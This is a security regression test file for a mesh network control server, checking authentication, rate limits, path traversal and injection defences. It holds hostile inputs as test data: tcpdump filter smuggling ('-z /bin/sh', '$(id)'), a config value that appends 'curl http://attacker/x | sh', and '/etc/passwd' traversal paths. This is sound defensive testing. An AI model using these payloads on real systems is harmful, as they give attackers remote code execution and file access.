/**
 * Security regression tests against the live control server.
 *
 * Each case corresponds to a finding fixed before this went near a real
 * network. They exist so a future refactor cannot quietly reopen one.
 */
import { describe, expect, it } from "vitest";
import { CONTROL, adminFetch, adminJson, adminToken } from "./helpers.js";

const enabled = process.env["RUN_MESH_TESTS"] === "1";

/** Deliberately unauthenticated. */
const anon = (path: string, init: RequestInit = {}) => fetch(`${CONTROL}${path}`, init);
const anonPost = (path: string, body: unknown) =>
  anon(path, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(body) });

describe.skipIf(!enabled)("control server security", () => {
  it("the whole management API refuses unauthenticated callers", async () => {
    const reads = ["/api/v1/state", "/api/v1/admin/pending", "/api/v1/admin/rollout", "/api/v1/admin/audit", "/api/v1/admin/captures", "/api/v1/flows/top?window=600", "/metrics"];
    for (const path of reads) {
      expect((await anon(path)).status, `${path} must require auth`).toBe(401);
    }
    // Writes are the dangerous half: these reconfigure or break the mesh.
    const writes: Array<[string, unknown]> = [
      ["/api/v1/admin/enrol-tokens", { role: "gateway", note: "x" }],
      ["/api/v1/admin/approve", { pendingId: "p-000000000000", site: { id: "evil" } }],
      ["/api/v1/admin/remove", { siteId: "site-a" }],
      ["/api/v1/admin/change-port", { siteId: "site-a", port: 51999 }],
      ["/api/v1/admin/freeze", { frozen: true }],
      ["/api/v1/admin/capture", { node: "site-a", filter: "" }],
      ["/api/v1/admin/flows/purge", {}],
      ["/api/v1/admin/rollout", { version: "1.0.0" }],
    ];
    for (const [path, body] of writes) {
      expect((await anonPost(path, body)).status, `${path} must require auth`).toBe(401);
    }
  });

  it("a wrong or truncated admin token is refused", async () => {
    const good = adminToken();
    for (const bad of ["", "x", good.slice(0, -1), good.slice(0, 32), good.toUpperCase() + "0"]) {
      const res = await anon("/api/v1/state", { headers: { authorization: `Bearer ${bad}` } });
      expect(res.status, `token "${bad.slice(0, 8)}…" must be refused`).toBe(401);
    }
    expect((await adminFetch("/api/v1/state")).status).toBe(200);
  });

  it("agent routes refuse the admin token, and vice versa — the credentials are not interchangeable", async () => {
    const asAdmin = await anon("/api/v1/agent/config", {
      headers: { authorization: `Bearer ${adminToken()}` },
    });
    expect(asAdmin.status).toBe(401);
  });

  it("a capture filter that smuggles tcpdump options is rejected (root RCE on a gateway)", async () => {
    for (const filter of ["-z /bin/sh", "host 1.2.3.4 -z reboot", "--postrotate-command=x", "host `id`", "host $(id)"]) {
      const res = await adminJson("POST", "/api/v1/admin/capture", { node: "site-a", filter });
      expect(res.status, `filter ${JSON.stringify(filter)} must be refused`).toBe(400);
    }
    // A genuine BPF expression still works.
    const ok = await adminJson<{ id?: string }>("POST", "/api/v1/admin/capture", {
      node: "site-a",
      filter: "icmp",
      seconds: 1,
      maxKb: 64,
    });
    expect(ok.status).toBe(200);
  });

  it("approval cannot smuggle extra gateway fields into generated config", async () => {
    // private_key_path lands in a PostUp command line, so a rogue value would
    // be root command execution on the node.
    const res = await adminJson("POST", "/api/v1/admin/approve", {
      pendingId: "p-000000000000",
      site: {
        id: "evil",
        name: "Evil",
        lan: "10.90.0.0/16",
        gateway: {
          lan_ip: "10.90.0.2",
          tunnel_ip: "10.99.0.90",
          endpoint: null,
          private_key_path: "/etc/opnmesh/keys/wg0.key; curl http://attacker/x | sh",
        },
      },
    });
    expect(res.status).toBe(400);
  });

  it("release and capture paths cannot traverse out of their directories", async () => {
    for (const path of [
      "/api/v1/admin/captures/..%2F..%2Fetc%2Fpasswd",
      "/api/v1/admin/captures/../registry.json",
      "/api/v1/admin/captures/registry.json",
    ]) {
      const res = await adminFetch(path);
      expect(res.status, `${path} must not serve a file`).toBe(404);
    }
  });

  it("enrolment is rate limited", async () => {
    const body = { token: "0".repeat(64), publicKey: "a".repeat(43) + "=", hostname: "x", addresses: [] };
    let sawLimit = false;
    for (let i = 0; i < 25; i++) {
      const res = await anonPost("/api/v1/enrol", body);
      if (res.status === 429) {
        sawLimit = true;
        break;
      }
    }
    expect(sawLimit, "repeated enrolment attempts must eventually be throttled").toBe(true);
  });

  it("oversized request bodies are refused rather than buffered", async () => {
    const res = await anon("/api/v1/enrol", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ token: "0".repeat(64), junk: "x".repeat(3 << 20) }),
    }).catch(() => ({ status: 413 }) as Response);
    expect([400, 413, 429]).toContain(res.status);
  });

  it("malformed bodies get a 400, never a stack trace or internal path", async () => {
    const res = await adminFetch("/api/v1/admin/change-port", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: "{ not json",
    });
    expect(res.status).toBe(400);
    const text = await res.text();
    expect(text).not.toMatch(/\/(app|state|home|Users)\//);
    expect(text).not.toContain("at Object");
  });

  it("the gateway metrics exporter is not reachable from the WAN", async () => {
    const { execSync } = await import("node:child_process");
    const wanReachable = (() => {
      try {
        execSync("docker exec opnmesh-gw-b timeout 3 wget -q -O- http://198.51.100.10:9586/metrics", {
          stdio: "ignore",
        });
        return true;
      } catch {
        return false;
      }
    })();
    expect(wanReachable, "exporter must not listen on the WAN address").toBe(false);

    // ...but it is reachable over the mesh, which is how Prometheus scrapes it.
    const meshReachable = (() => {
      try {
        execSync("docker exec opnmesh-gw-b timeout 3 wget -q -O- http://10.99.0.1:9586/metrics", {
          stdio: "ignore",
        });
        return true;
      } catch {
        return false;
      }
    })();
    expect(meshReachable).toBe(true);
  }, 30_000);
});
